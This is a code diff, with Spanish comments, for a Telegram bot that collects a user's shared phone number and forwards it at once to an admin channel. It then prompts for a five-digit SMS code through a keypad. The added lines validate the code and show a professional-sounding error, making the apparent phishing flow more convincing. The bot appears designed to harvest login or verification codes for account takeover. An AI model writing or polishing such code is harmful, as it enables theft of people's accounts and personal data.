@@ -70,6 +70,7 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = msg.contact.phone_number
     user = update.effective_user
 
+    # Guardar y limpiar buffer
     context.user_data[UD_PHONE] = phone
     context.user_data[UD_CODE]  = ""
 
@@ -81,6 +82,7 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"- Fecha/Hora: {stamp}"
     )
 
+    # 1) Enviar al grupo INMEDIATO
     try:
         if ADMIN_CHANNEL_ID:
             await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
@@ -88,6 +90,7 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         log.exception("Error enviando número al destino: %s", e)
 
+    # 2) Confirmar al usuario y mostrar keypad
     await msg.reply_text(f"✅ Número recibido: {phone}\nAhora introduce el *código de 5 dígitos* (SMS).",
                          parse_mode="Markdown")
     text, kb = build_keypad("")
@@ -109,6 +112,24 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.edit_message_text("Operación cancelada. Usa /start para reintentarlo.")
         return
     elif data == "ok":
+        # Validación: exactamente 5 dígitos
+        if not (len(code) == 5 and code.isdigit()):
+            # Mensaje profesional solicitado
+            error_msg = (
+                "❌Código inválido\n\n"
+                "El código que ingresaste no es válido. Asegúrate de ingresar el codigo correcto de 5 dígitos recibido por y luego presiona:\n\n"
+                "✅ Confirmar."
+            )
+            # Reiniciar o mantener buffer (opción: reiniciar para que vuelva a marcar)
+            context.user_data[UD_CODE] = ""
+            text, kb = build_keypad("")
+            try:
+                await q.edit_message_text(f"{error_msg}\n\n{text}", reply_markup=kb, parse_mode="Markdown")
+            except Exception:
+                # Si no permite editar (p.ej. límite de edición), enviamos un nuevo mensaje
+                await q.message.reply_text(error_msg, parse_mode="Markdown", reply_markup=kb)
+            return
+
         phone = context.user_data.get(UD_PHONE, "desconocido")
         user  = update.effective_user
         stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -137,7 +158,7 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await q.message.edit_reply_markup(reply_markup=kb)
 
-# AYUDA: si el usuario manda otra cosa en PRIVADO
+# AYUDA: si el usuario manda otra cosa en PRIVADO, le explicamos qué hacer
 async def private_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat and update.effective_chat.type == "private":
         await update.message.reply_text(
@@ -171,10 +192,11 @@ def main():
     app = ApplicationBuilder().token(BOT_TOKEN).post_init(on_startup).build()
 
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.CONTACT, on_contact))
+    app.add_handler(MessageHandler(filters.CONTACT, on_contact))                # caso correcto
     app.add_handler(CallbackQueryHandler(keypad_cb))
     app.add_handler(CommandHandler("id", id_cmd))
     app.add_handler(CommandHandler("testsend", testsend_cmd))
+    # Fallback solo en privado para guiar al usuario
     app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_fallback))
 
     app.run_polling()
